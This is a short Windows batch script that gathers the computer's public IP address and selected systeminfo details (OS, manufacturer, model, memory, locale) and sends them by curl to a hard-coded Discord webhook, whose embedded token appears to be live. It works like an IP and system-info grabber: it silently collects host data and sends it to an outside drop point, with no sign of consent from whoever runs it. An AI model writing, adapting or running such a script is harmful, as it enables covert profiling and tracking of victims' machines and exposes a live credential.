@echo off
setlocal enabledelayedexpansion

set WEBHOOK_URL="https://discord.com/api/webhooks/1305468665814319165/rB4sM8dYCdqLqqXzqb9NJwnODWp5U7hNPS7dOSNJX8qRbgHeC5qg8sO5HHkIx1pK6jov"

:: Get the public IP address
for /f "tokens=*" %%a in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%a

:: Initialize variable to store system info
set INFO=**Public IP:** !PUBLIC_IP!^


:: Capture only relevant information with new lines and bold labels
for /f "tokens=1,*" %%a in ('systeminfo ^| findstr /i "OS OSName System Manufacturer Total Physical Memory Name Manufacturer Model Version Locale"') do (
    set INFO=!INFO!**%%a:** %%b^


)

:: If INFO is still empty, add a fallback message
if "!INFO!"=="" (
    set INFO=System info could not be retrieved.
)

:: Send the captured system info and public IP to Discord webhook
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "content=!INFO!" %WEBHOOK_URL%

echo Script completed.
pause
